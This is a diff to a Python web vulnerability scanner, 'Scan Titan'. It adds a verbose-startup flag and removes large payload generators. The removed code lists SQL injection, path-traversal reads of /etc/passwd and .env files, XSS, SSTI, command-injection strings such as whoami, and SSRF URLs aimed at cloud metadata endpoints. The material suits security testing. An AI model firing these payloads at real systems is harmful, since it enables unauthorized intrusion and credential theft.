@@ -243,7 +243,7 @@ KNOWLEDGE_FILE = _path_from_env(
     "SCAN_TITAN_KNOWLEDGE_FILE",
     _first_existing(BASE_DIR / "data" / "scan_titan_knowledge.json", BASE_DIR / "scan_titan_knowledge.json"),
 )
-SCAN_VERSION = "TITAN v22.1.0 COMMUNITY ZERO-TOUCH"
+SCAN_VERSION = "TITAN v22.1.1 COMMUNITY ZERO-TOUCH"
 HEADER_SEPARATOR = "=" * 72
 REPORT_SEPARATOR = "─" * 72
 
@@ -677,7 +677,7 @@ class Console:
 {Fore.RED}  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝       ╚═╝   ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝
 {Fore.YELLOW}        [ SCAN TITAN :: WALL-BREACH VULNERABILITY ENGINE ]
 {Fore.CYAN}        [ ZERO-TOUCH | RECON | DAST | NMAP | NUCLEI | EVIDENCE ]
-{Fore.MAGENTA}        [ SCAN TITAN COMMUNITY | TATAKAE | ⚔️ v22.1.0 ⚔️ ]
+{Fore.MAGENTA}        [ SCAN TITAN COMMUNITY | TATAKAE | ⚔️ v22.1.1 ⚔️ ]
 """
         )
 
@@ -1186,6 +1186,7 @@ class RuntimeConfig:
         config_data = self._load_yaml(CONFIG_FILE)
         config_data = self._merge_config(config_data, self._load_yaml(LOCAL_CONFIG_FILE))
         scan_cfg = config_data.get("scan", {}) if isinstance(config_data.get("scan"), dict) else {}
+        self.verbose_startup = bool(getattr(args, "verbose_startup", False))
         self.full_power = bool(getattr(args, "full", False))
         self.policy = PolicyEngine(config_data, args).build()
         self.runtime_control = RuntimeControl()
@@ -1633,7 +1634,6 @@ class TargetLoader:
 
 
 class WordlistLoader:
-    MIN_EFFECTIVE_ENTRIES = 10_000
     FILES = {
         "403bypass": "403bypass.txt",
         "command_injection": "command_injection.txt",
@@ -1646,15 +1646,14 @@ class WordlistLoader:
         "subdomains": "subdomains.txt",
         "users": "users.txt",
         "xss": "xss.txt",
-        "xss_payloads": "xss_payloads.txt",
     }
+    IGNORED_STEMS = {"xss_payloads"}  # Legacy duplicate; xss.txt is canonical.
     ALIASES = {
         "directories": "rutas",
         "directory": "rutas",
         "paths": "rutas",
         "cmdi": "command_injection",
         "command": "command_injection",
-        "xss_payload": "xss_payloads",
     }
     LFI_TOKEN_MAP = {
         "{TRAV}": "../",
@@ -1701,16 +1700,18 @@ class WordlistLoader:
         self.root = root
         self.max_entries = max_entries
 
-    def load(self) -> dict[str, list[str]]:
+    def load(self, *, verbose: bool = False) -> dict[str, list[str]]:
         data: dict[str, list[str]] = {}
         for key, filename in self.FILES.items():
             data[key] = self._load_file(self.root / filename, key)
-            Console.step(f"wordlist {key:<10}: {len(data[key])} entries")
+            if verbose:
+                Console.step(f"wordlist {key:<18}: {len(data[key])} entradas reales cargadas")
         for path in sorted(self.root.glob("*.txt")):
             key = path.stem.strip().lower().replace("-", "_")
-            if key not in data:
+            if key not in data and key not in self.IGNORED_STEMS:
                 data[key] = self._load_file(path, key)
-                Console.step(f"wordlist {key:<10}: {len(data[key])} entries")
+                if verbose:
+                    Console.step(f"wordlist {key:<18}: {len(data[key])} entradas reales cargadas")
         for alias, canonical in self.ALIASES.items():
             if canonical in data and alias not in data:
                 data[alias] = data[canonical]
@@ -1720,20 +1721,23 @@ class WordlistLoader:
         if not path.exists():
             return []
         values: list[str] = []
+        seen: set[str] = set()
         try:
             with path.open("r", encoding="utf-8", errors="ignore") as handle:
                 for line in handle:
                     clean = re.sub(r"[\x00-\x1f\x7f]", "", line).strip()
-                    if clean and not clean.startswith("#"):
-                        values.append(self._decode_wordlist_entry(key, clean))
+                    if not clean or clean.startswith("#"):
+                        continue
+                    value = self._decode_wordlist_entry(key, clean).strip()
+                    dedupe_key = value.casefold()
+                    if not value or dedupe_key in seen:
+                        continue
+                    seen.add(dedupe_key)
+                    values.append(value)
                     if self.max_entries > 0 and len(values) >= self.max_entries:
                         break
         except Exception as exc:
             Console.warn(f"Wordlist omitida {path}: {exc}")
-        values = self._dedupe(values)
-        values = self._ensure_effective_minimum(key, values)
-        if self.max_entries > 0:
-            values = values[: self.max_entries]
         return values
 
     def _decode_wordlist_entry(self, key: str, value: str) -> str:
@@ -1752,290 +1756,6 @@ class WordlistLoader:
             decoded = decoded.replace(bdepth_match.group(0), "..\\" * depth)
         return decoded
 
-    def _dedupe(self, values: list[str]) -> list[str]:
-        out: list[str] = []
-        seen: set[str] = set()
-        for value in values:
-            clean = str(value or "").strip()
-            key = clean.casefold()
-            if clean and key not in seen:
-                seen.add(key)
-                out.append(clean)
-        return out
-
-    def _ensure_effective_minimum(self, key: str, values: list[str]) -> list[str]:
-        if self.max_entries > 0 and self.max_entries < self.MIN_EFFECTIVE_ENTRIES:
-            target_size = self.max_entries
-        else:
-            target_size = self.MIN_EFFECTIVE_ENTRIES
-        if len(values) >= target_size:
-            return values
-        out = list(values)
-        seen = {item.casefold() for item in out}
-
-        def add(candidate: str) -> bool:
-            clean = str(candidate or "").strip()
-            if not clean or len(clean) > 260:
-                return len(out) >= target_size
-            dedupe_key = clean.casefold()
-            if dedupe_key not in seen:
-                seen.add(dedupe_key)
-                out.append(clean)
-            return len(out) >= target_size
-
-        for candidate in self._generated_entries_for(key, values):
-            if add(candidate):
-                break
-        seed_pool = values or [key]
-        counter = 0
-        while len(out) < target_size:
-            seed = seed_pool[counter % len(seed_pool)]
-            suffix = f"{counter:04d}"
-            if key == "subdomains":
-                candidate = f"{seed}-{suffix}"
-            elif key == "users":
-                candidate = f"{seed}{suffix}"
-            elif key == "passwords":
-                candidate = f"{seed}{suffix}!"
-            elif key == "rutas":
-                candidate = f"{str(seed).strip('/')}-{suffix}/"
-            else:
-                candidate = f"{seed}/*scan_titan_{suffix}*/"
-            add(candidate)
-            counter += 1
-        return out
-
-    def _generated_entries_for(self, key: str, values: list[str]) -> list[str]:
-        generators = {
-            "403bypass": self._generate_403_bypass,
-            "command_injection": self._generate_command_injection,
-            "lfi": self._generate_lfi,
-            "sqli": self._generate_sqli,
-            "ssrf": self._generate_ssrf,
-            "ssti": self._generate_ssti,
-            "subdomains": self._generate_subdomains,
-            "users": self._generate_users,
-            "xss": self._generate_xss,
-            "xss_payloads": self._generate_xss,
-        }
-        generator = generators.get(key)
-        return generator(values) if generator else []
-
-    def _encoded_variants(self, value: str) -> list[str]:
-        quoted = urllib.parse.quote(value, safe="")
-        partial = urllib.parse.quote(value, safe="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")
-        return [
-            value,
-            partial,
-            quoted,
-            quoted.replace("%", "%25"),
-            value.replace(" ", "/**/"),
-            value.replace(" ", "%09"),
-            value.replace(" ", "%0a"),
-            value.replace("/", "%2f"),
-        ]
-
-    def _generate_sqli(self, values: list[str]) -> list[str]:
-        out: list[str] = []
-        bases = values[:800] or ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1"]
-        for seed in bases:
-            out.extend(self._encoded_variants(seed))
-        prefixes = ["", "'", "\"", "1'", "1\"", "')", "\")", "%27", "%22"]
-        operators = [" OR ", " AND ", "/**/OR/**/", "/**/AND/**/", "%20OR%20", "%09OR%09"]
-        conditions = ["1=1", "2=2", "'a'='a'", "\"a\"=\"a\"", "1 LIKE 1", "1 IN (1)", "NOT 1=2"]
-        tails = ["--", "-- -", "#", "/*", "%23", "%2d%2d", ";--", ")--"]
-        for prefix in prefixes:
-            for operator in operators:
-                for condition in conditions:
-                    for tail in tails:
-                        out.append(f"{prefix}{operator}{condition}{tail}")
-        for columns in range(1, 21):
-            nulls = ",".join(["NULL"] * columns)
-            out.extend(
-                [
-                    f"' UNION SELECT {nulls}-- -",
-                    f"') UNION SELECT {nulls}-- -",
-                    f"\" UNION SELECT {nulls}-- -",
-                    f"' ORDER BY {columns}-- -",
-                    f"\") ORDER BY {columns}-- -",
-                ]
-            )
-        return out
-
-    def _generate_lfi(self, _values: list[str]) -> list[str]:
-        files = [
-            "/etc/passwd",
-            "/etc/hosts",
-            "/etc/issue",
-            "/etc/resolv.conf",
-            "/proc/self/environ",
-            "/proc/self/cmdline",
-            "/proc/version",
-            "windows/win.ini",
-            "boot.ini",
-            "windows/system32/drivers/etc/hosts",
-            ".env",
-            "config.php",
-            "wp-config.php",
-            "web.config",
-            "application.properties",
-            "application.yml",
-            "appsettings.json",
-            "WEB-INF/web.xml",
-        ]
-        prefixes = ["../", "..\\", "....//", "..%2f", "..%5c", "%2e%2e%2f", "%252e%252e%252f"]
-        suffixes = ["", "%00", "%2500", ".", "%0a", "%0d%0a", "?scan_titan=1", "#"]
-        wrappers = ["{trav}{file}", "/{trav}{file}", "file:///{trav}{file}", "php://filter/convert.base64-encode/resource={trav}{file}"]
-        out: list[str] = []
-        for depth in range(1, 13):
-            for prefix in prefixes:
-                traversal = prefix * depth
-                for file_name in files:
-                    clean_file = file_name.lstrip("/")
-                    for wrapper in wrappers:
-                        candidate = wrapper.format(trav=traversal, file=clean_file)
-                        for suffix in suffixes:
-                            out.append(candidate + suffix)
-        return out
-
-    def _generate_xss(self, values: list[str]) -> list[str]:
-        out: list[str] = []
-        seeds = values[:700] or [
-            "<script>alert(1)</script>",
-            "\"><svg/onload=alert(1)>",
-            "<img src=x onerror=alert(1)>",
-        ]
-        for seed in seeds:
-            out.extend(self._encoded_variants(seed))
-        tags = ["svg", "img", "body", "details", "input", "iframe", "video", "audio", "marquee", "math"]
-        events = ["onload", "onerror", "onclick", "onmouseover", "onfocus", "ontoggle", "onbegin", "onanimationstart"]
-        calls = ["alert(1)", "confirm(1)", "prompt(1)", "window['alert'](1)", "top['ale'+'rt'](1)"]
-        wrappers = ["<{tag} {event}={call}>", "\"><{tag} {event}={call}>", "'><{tag} {event}={call}>", "<{tag}/{event}={call}>"]
-        for tag in tags:
-            for event in events:
-                for call in calls:
-                    for wrapper in wrappers:
-                        payload = wrapper.format(tag=tag, event=event, call=call)
-                        out.extend(self._encoded_variants(payload))
-        return out
-
-    def _generate_ssti(self, values: list[str]) -> list[str]:
-        out: list[str] = []
-        seeds = values[:300]
-        for seed in seeds:
-            out.extend(self._encoded_variants(seed))
-        expressions = ["7*7", "6*7", "9*9"]
-        wrappers = [
-            "{{{expr}}}",
-            "${{{expr}}}",
-            "<%={expr}%>",
-            "#{{{expr}}}",
-            "*{{{expr}}}",
-            "'{{{expr}}}'",
-            "\"{{{expr}}}\"",
-            "{{{{{expr}}}}}",
-            "${{{{{expr}}}}}",
-            "{{% print({expr}) %}}",
-        ]
-        prefixes = ["", "scan_titan", "../", "'\"", "%27", "%22", "<!--", "${", "{{"]
-        suffixes = ["", "}}", "}", "-->", "%00", "%0a", "scan_titan", "/*"]
-        for expr in expressions:
-            for wrapper in wrappers:
-                base = wrapper.format(expr=expr)
-                for prefix in prefixes:
-                    for suffix in suffixes:
-                        out.extend(self._encoded_variants(prefix + base + suffix))
-        return out
-
-    def _generate_ssrf(self, values: list[str]) -> list[str]:
-        out: list[str] = []
-        seeds = values[:300]
-        for seed in seeds:
-            out.extend(self._encoded_variants(seed))
-        hosts = [
-            "127.0.0.1",
-            "localhost",
-            "[::1]",
-            "0.0.0.0",
-            "169.254.169.254",
-            "metadata.google.internal",
-            "kubernetes.default.svc",
-        ]
-        hosts.extend(f"127.0.0.{index}" for index in range(1, 256))
-        hosts.extend(f"10.0.{a}.{b}" for a in range(0, 8) for b in range(1, 16))
-        hosts.extend(f"192.168.{a}.{b}" for a in range(0, 8) for b in range(1, 16))
-        ports = [80, 443, 8000, 8080, 8081, 8443, 9000, 9090, 9200, 2375, 2379, 5000, 5432, 6379, 27017]
-        paths = ["/", "/admin", "/health", "/metrics", "/server-status", "/latest/meta-data/", "/metadata/v1/", "/version"]
-        for scheme in ["http", "https"]:
-            for host in hosts:
-                for port in ports:
-                    for path in paths:
-                        out.append(f"{scheme}://{host}:{port}{path}")
-        return out
-
-    def _generate_command_injection(self, values: list[str]) -> list[str]:
-        out: list[str] = []
-        seeds = values[:300]
-        for seed in seeds:
-            out.extend(self._encoded_variants(seed))
-        commands = [
-            "echo scan_titan_marker",
-            "id",
-            "whoami",
-            "uname -a",
-            "cat /etc/hosts",
-            "type C:\\Windows\\win.ini",
-            "ipconfig",
-            "dir",
-        ]
-        separators = [";", "&&", "||", "|", "%26%26", "%7c", "%3b", "`", "$(", "\n", "%0a", "&"]
-        wrappers = ["{sep}{cmd}", "test{sep}{cmd}", "\"{sep}{cmd}", "'{sep}{cmd}", "1{sep}{cmd}{sep}", "$({cmd})", "`{cmd}`"]
-        for separator in separators:
-            for command in commands:
-                for wrapper in wrappers:
-                    payload = wrapper.format(sep=separator, cmd=command)
-                    out.extend(self._encoded_variants(payload))
-        return out
-
-    def _generate_403_bypass(self, values: list[str]) -> list[str]:
-        out = list(values[:600])
-        base_paths = ["admin", "api", "login", "dashboard", "server-status", ".env", ".git/config", "config.php", "debug", "metrics"]
-        prefixes = ["", "/", "//", "/./", "/../", "%2f", "%252f", ";", "%3b", "%20", "%09", "%00"]
-        suffixes = ["", "/", "/.", "..;/", ";", "%3b", "%20", "%09", "?", "??", "#", "%23", ".json", ".bak"]
-        for path in base_paths:
-            for prefix in prefixes:
-                for suffix in suffixes:
-                    candidate = f"{prefix}{path}{suffix}"
-                    out.extend([candidate, urllib.parse.quote(candidate, safe="/.%")])
-        return out
-
-    def _generate_subdomains(self, values: list[str]) -> list[str]:
-        out = list(values[:500])
-        bases = values[:300] or ["www", "api", "admin", "portal", "dev", "test", "qa", "vpn", "mail"]
-        envs = ["dev", "qa", "uat", "stage", "stg", "pre", "prod", "int", "corp", "cloud", "app", "web", "api"]
-        regions = ["gt", "sv", "hn", "ni", "cr", "pa", "us", "mx", "latam"]
-        for base in bases:
-            clean = re.sub(r"[^a-zA-Z0-9-]", "", base).lower() or "host"
-            for env in envs:
-                for region in regions:
-                    out.extend([f"{env}-{clean}", f"{clean}-{env}", f"{clean}-{region}", f"{env}-{clean}-{region}"])
-            for index in range(0, 250):
-                out.append(f"{clean}{index:02d}")
-        return out
-
-    def _generate_users(self, values: list[str]) -> list[str]:
-        out = list(values[:600])
-        bases = values[:400] or ["admin", "administrator", "root", "user", "test", "auditor", "soporte", "operador"]
-        suffixes = ["", "1", "01", "123", "2024", "2025", "2026", ".admin", "_admin", ".test", "_test", "-dev"]
-        domains = ["", "@local", "@example.com", "@corp.local", "@domain.local"]
-        for base in bases:
-            clean = re.sub(r"[^A-Za-z0-9._-]", "", base) or "user"
-            for suffix in suffixes:
-                for domain in domains:
-                    out.append(f"{clean}{suffix}{domain}")
-            for index in range(0, 120):
-                out.append(f"{clean}{index:03d}")
-        return out
 
 
 class StateStore:
@@ -6239,12 +5959,15 @@ class ScanTitan:
             if config.knowledge_enabled
             else KnowledgeBase(config.knowledge_path, [], config.knowledge_min_score)
         )
-        if config.knowledge_enabled and self.knowledge_base.entries:
+        if config.verbose_startup and config.knowledge_enabled and self.knowledge_base.entries:
             Console.ok(f"Base de conocimiento cargada: {len(self.knowledge_base.entries)} entradas")
         elif config.knowledge_enabled:
-            Console.warn(f"Base de conocimiento no encontrada o vacia: {config.knowledge_path}")
+            if not self.knowledge_base.entries:
+                Console.warn(f"Base de conocimiento no encontrada o vacia: {config.knowledge_path}")
         self.scorer = FindingScorer(self.knowledge_base if config.knowledge_enabled else None)
-        self.wordlists = WordlistLoader(WORDLISTS_DIR, config.max_wordlist_entries).load()
+        self.wordlists = WordlistLoader(WORDLISTS_DIR, config.max_wordlist_entries).load(
+            verbose=config.verbose_startup
+        )
 
     async def run(self) -> int:
         control_task = asyncio.create_task(self.config.runtime_control.keyboard_loop())
@@ -6265,31 +5988,33 @@ class ScanTitan:
             if audit_id:
                 label = "ID maestro automatico de auditoria" if self.config.audit_id_automatic else "ID maestro de auditoria"
                 Console.ok(f"{label}: {audit_id}")
-            Console.ok(
-                "Modo de red estable: TCPConnector=25 | semaforo HTTP<=20 | "
-                f"targets={self.config.target_concurrency} | general={self.config.jitter_min_seconds:.1f}-"
-                f"{self.config.jitter_max_seconds:.1f}s/{self.config.throttle_batch_size} peticiones | "
-                f"payload={self.config.payload_jitter_min_seconds:.1f}-"
-                f"{self.config.payload_jitter_max_seconds:.1f}s/{self.config.payload_throttle_batch_size} peticion"
-            )
-            Console.ok(
-                "Perfil de politica: "
-                f"{self.config.policy.profile} | browser={self.config.policy.enable_browser} | "
-                f"pruebas-con-cambio={self.config.policy.allow_state_changing_api_tests} | "
-                f"tarjetas-evidencia={self.config.policy.evidence_cards} | "
-                f"evidencia-browser={self.config.policy.browser_evidence}"
-            )
+            if self.config.verbose_startup:
+                Console.ok(
+                    "Modo de red estable: TCPConnector=25 | semaforo HTTP<=20 | "
+                    f"targets={self.config.target_concurrency} | general={self.config.jitter_min_seconds:.1f}-"
+                    f"{self.config.jitter_max_seconds:.1f}s/{self.config.throttle_batch_size} peticiones | "
+                    f"payload={self.config.payload_jitter_min_seconds:.1f}-"
+                    f"{self.config.payload_jitter_max_seconds:.1f}s/{self.config.payload_throttle_batch_size} peticion"
+                )
+                Console.ok(
+                    "Perfil de politica: "
+                    f"{self.config.policy.profile} | browser={self.config.policy.enable_browser} | "
+                    f"pruebas-con-cambio={self.config.policy.allow_state_changing_api_tests} | "
+                    f"tarjetas-evidencia={self.config.policy.evidence_cards} | "
+                    f"evidencia-browser={self.config.policy.browser_evidence}"
+                )
             if self.config.full_power:
                 Console.warn(
                     "MODO FULL POWER: todos los modulos/perfiles externos habilitados | "
                     f"max-tests={self.config.max_tests_per_module} | wordlists=sin-limite | "
                     f"ZAP={self.config.zap_mode} | report-min={self.config.report_min_severity}"
                 )
-            Console.ok(
-                "ZAP externo: "
-                f"enabled={self.config.policy.enable_zap} | mode={self.config.zap_mode} | "
-                f"api={self.config.zap_api_url}"
-            )
+            if self.config.verbose_startup:
+                Console.ok(
+                    "ZAP externo: "
+                    f"enabled={self.config.policy.enable_zap} | mode={self.config.zap_mode} | "
+                    f"api={self.config.zap_api_url}"
+                )
             self.telemetry.phase("tool_inventory", "inventario de herramientas externas")
             self.external.write_tool_inventory()
             target_semaphore = asyncio.Semaphore(self.config.target_concurrency)
@@ -6914,6 +6639,7 @@ def build_argparser() -> argparse.ArgumentParser:
     parser.add_argument("--target-concurrency", type=int, help="Objetivos concurrentes")
     parser.add_argument("--max-tests", type=int, help="Maximo de pruebas por modulo")
     parser.add_argument("--max-wordlist-entries", type=int, help="Maximo de entradas cargadas por wordlist")
+    parser.add_argument("--verbose-startup", action="store_true", help="Mostrar detalles de configuracion y conteos reales al iniciar")
     parser.add_argument("--delay", type=float, help="Delay base entre peticiones HTTP")
     parser.add_argument("--module-timeout", type=int, help="Timeout estricto por modulo en segundos")
     parser.add_argument("--nmap-timeout", type=int, help="Timeout estricto de Nmap en segundos")
